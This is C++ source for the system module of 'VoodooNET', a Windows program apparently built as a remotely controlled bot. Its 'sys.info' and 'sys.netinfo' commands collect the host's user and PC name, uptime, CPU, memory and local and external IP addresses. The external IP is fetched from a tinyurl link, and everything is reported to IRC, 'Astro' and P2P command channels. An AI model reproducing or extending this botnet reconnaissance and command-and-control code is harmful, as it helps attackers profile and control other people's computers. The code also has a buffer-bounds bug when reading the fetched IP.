/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include <NTstatus.h>
#define WIN32_NO_STATUS
#include "includes.h"
#include <sysinfoapi.h>
#include <Powrprof.h>
#include <iostream>
///#include <wininet.h>
#pragma comment(lib, "wininet")
#pragma comment(lib, "Powrprof.lib")

typedef struct _PROCESSOR_POWER_INFORMATION {
	ULONG  Number;
	ULONG  MaxMhz;
	ULONG  CurrentMhz;
	ULONG  MhzLimit;
	ULONG  MaxIdleState;
	ULONG  CurrentIdleState;
} PROCESSOR_POWER_INFORMATION, * PPROCESSOR_POWER_INFORMATION;



cSystem::cSystem()
{

}

cSystem::~cSystem()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cSystem:Destruct", "Destroying cSystem Module");
#endif
}


void cSystem::Init()
{
	ADDCMD(m_cmdSysInfo, "sys.info", "Shows CPU + Memory + HDD", this);
	ADDCMD(m_cmdNetInfo, "sys.netinfo", "Show Internal and External", this);

	ADDMODULE(m_cSysModule, "cSystem", "0.1", "System Module");

}


bool cSystem::HandleCommand(char* cmd, char* params, ...)
{
	int iCount = 0;
	list<command*>::iterator ic;

	for (ic = g_cVoodoo->m_cCommands.m_lCommands.begin(); ic != g_cVoodoo->m_cCommands.m_lCommands.end(); ++ic)
	{
		iCount++;
		if (!_strcmpi((*ic)->sName.c_str(), cmd))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("cCommands:Registered", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cCommands04]: 04[15CommandNum:00 %d04]:00 %s04] [15Description: 00%s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
		}
	}
	if (!_strcmpi("sys.info", cmd))
	{
#ifndef NO_IRC
		g_cVoodoo->m_cIRC.sendmsg("[cSystem]: %s", cmd);
#endif
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15cSystem04]:00 %s", cmd);
#endif
		MEMORYSTATUSEX status2;
		status2.dwLength = sizeof(status2);
		GlobalMemoryStatusEx(&status2);
		
		SYSTEM_INFO si = { 0 };
		::GetSystemInfo(&si);
		// allocate buffer to get info for each processor
		const int size = si.dwNumberOfProcessors * sizeof(PROCESSOR_POWER_INFORMATION);
		LPBYTE pBuffer = new BYTE[size];

		NTSTATUS status = ::CallNtPowerInformation(ProcessorInformation, NULL, 0, pBuffer, size);
		// list each processor frequency 
		PPROCESSOR_POWER_INFORMATION ppi = (PPROCESSOR_POWER_INFORMATION)pBuffer;
#ifdef _DEBUG
		g_cVoodoo->m_cLogging.PrintLine("cSystem:CPU Info", "Showing CPU info");
		g_cVoodoo->m_cLogging.PrintLine("cSystem:CPU Info", "CPU Frequency : %dMHz", ppi->CurrentMhz);
#endif
		DWORD dwD, dwH, dwM, dwS;
		DWORD tick = (DWORD)GetTickCount64();
		tick /= 1000;
		dwD = tick / 86400;
		dwH = (tick / 3600) - (dwD * 24);
		dwM = (tick % 3600) / 60;
		dwS = (tick % 3600) % 60;
#ifndef NO_IRC
		g_cVoodoo->m_cIRC.sendmsg("[cSystem]: Creating System Info");
		g_cVoodoo->m_cIRC.sendmsg("[User@PC]: [%s]", GetPCInfo());
		g_cVoodoo->m_cIRC.sendmsg("[Uptime]: %d Days %d Hours %d Minutes %d Seconds", dwD, dwH, dwM, dwS);
		g_cVoodoo->m_cIRC.sendmsg("[CPU Clock: %dMHz / %dGHz]", ppi->CurrentMhz, (ppi->CurrentMhz / 1000));
		g_cVoodoo->m_cIRC.sendmsg("[Memory]: [Total:% dGB][Used:% dGB][Free:% dGB]", (status2.ullTotalPhys / 1000000000), ((status2.ullTotalPhys / 1000000000) - (status2.ullAvailPhys / 1000000000)), (status2.ullAvailPhys / 1000000000));
		g_cVoodoo->m_cIRC.sendmsg("[HDD]: To be Continued");
#endif
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15cSystem04]:00 Creating System Info");
		g_cVoodoo->m_cAstro.sendmsg("04[15User00@15PC04]: [00%s04]", GetPCInfo());
		g_cVoodoo->m_cAstro.sendmsg("04[15Uptime04]:00 %d Days %d Hours %d Minutes %d Seconds", dwD, dwH, dwM, dwS);
		g_cVoodoo->m_cAstro.sendmsg("04[15CPU Clock:00 %d15MHz 04/00 %d15GHz04]", ppi->CurrentMhz, (ppi->CurrentMhz / 1000));
		g_cVoodoo->m_cAstro.sendmsg("04[15Memory04]: [15Total:00 %d15GB04][15Used: 00%d15GB04][Free: 00%d15GB04]", (status2.ullTotalPhys / 1000000000), ((status2.ullTotalPhys / 1000000000) - (status2.ullAvailPhys / 1000000000)), (status2.ullAvailPhys / 1000000000));
//		g_cVoodoo->m_cAstro.sendmsg("[HDD]: To be Continued");
#endif
#ifndef NO_P2P
		for (int i = 1; i < MAX_CLIENTS; i++)
		{
			if (clients[i].socket != NULL)
			{
				g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[cSystem]: Creating System Info\r\n");
				g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[User@PC]: [%s]\r\n", GetPCInfo());
				g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[Uptime]: %d Days %d Hours %d Minutes %d Seconds\r\n", dwD, dwH, dwM, dwS);
				g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[CPU Clock: %dMHz / %dGHz]\r\n", ppi->CurrentMhz, (ppi->CurrentMhz / 1000));
				g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[Memory]: [Total:% dGB][Used:% dGB][Free:% dGB]\r\n", (status2.ullTotalPhys / 1000000000), ((status2.ullTotalPhys / 1000000000) - (status2.ullAvailPhys / 1000000000)), (status2.ullAvailPhys / 1000000000));
				g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[HDD]: To be Continued\r\n");
			}
		}
#endif
		return true;
	}
	if (!_strcmpi("sys.netinfo", cmd))
	{
#ifndef NO_P2P
		for (int i = 1; i < MAX_CLIENTS; i++)
		{
			if (clients[i].socket != NULL)
			{
				g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[Network]: %s\r\n", (char*)NetInfo());
			}
		}
#endif
#ifndef NO_IRC
		g_cVoodoo->m_cIRC.sendmsg("[Network]: %s", (char*)NetInfo());
#endif
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15Network04]:00 %s", (char*)NetInfo());
#endif
		return true;
	}
	return false;
}

/*
char* cSystem::NetInfo()
{
	static char ninfo[1024];
	
	SOCKADDR sa;
	int sas;
	sas = sizeof(sa);
	HINTERNET hInternet, hFile;
	DWORD rSize;
	char buffer[32];

	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hFile = InternetOpenUrlA(hInternet, "https://tinyurl.com/extip101", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!InternetReadFile(hFile, &buffer, sizeof(buffer), &rSize)) return NULL;
	buffer[rSize] = '\0';

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);

	memset(&sa, 0, sizeof(sa));
#ifndef NO_IRC
	getsockname(g_cVoodoo->m_cIRC.m_socket, &sa, &sas);
#endif
#ifndef NO_ASTRO
	getsockname(g_cVoodoo->m_cAstro.m_cSocket.GetSocket(), &sa, &sas);
#endif

	sprintf_s(ninfo, sizeof(ninfo) - 1, "04[15Local IP: 00%d.%d.%d.%d04] [15External IP:00 %s04]", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], buffer);

	//sprintf_s(ninfo, sizeof(ninfo) - 1, "test");

	return ninfo;

}*/

char* cSystem::NetInfo()
{
	SOCKADDR sa;
	struct sockaddr_in saip;
	char str[32];
	int sas;
	sas = sizeof(sa);
	HINTERNET hInternet, hFile;
	DWORD rSize;
	char buffer[32];
	static char ninfo[1024];

	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hFile = InternetOpenUrlA(hInternet, "https://tinyurl.com/extip101", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!InternetReadFile(hFile, &buffer, sizeof(buffer), &rSize)) return NULL;
	buffer[rSize] = '\0';
		
	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);

	// store this IP address in sa:
	//inet_pton(AF_INET, "192.168.1.1", &(saip.sin_addr));
	//printf("netlog: %d\r\n", inet_addr(buffer));

	int a, b, c, d;
	sscanf_s(buffer, "%d.%d.%d.%d", &a, &b, &c, &d);

	sprintf_s(ninfo, sizeof(ninfo) - 1, "%i.%i.%i.%i", a, b, c, d);
	return ninfo;
}